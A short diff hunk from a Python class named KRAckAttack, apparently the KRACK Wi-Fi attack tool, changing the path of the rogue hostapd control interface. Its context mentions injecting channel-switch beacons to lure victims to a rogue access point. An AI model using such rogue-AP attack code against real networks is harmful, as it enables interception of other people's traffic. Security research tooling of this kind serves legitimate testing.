@@ -927,7 +927,7 @@ class KRAckAttack():
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(1)
 
-		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
+		self.hostapd_ctrl = Ctrl("hostapd_ctrl." + self.nic_rogue_ap) # "hostapd_ctrl/"
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
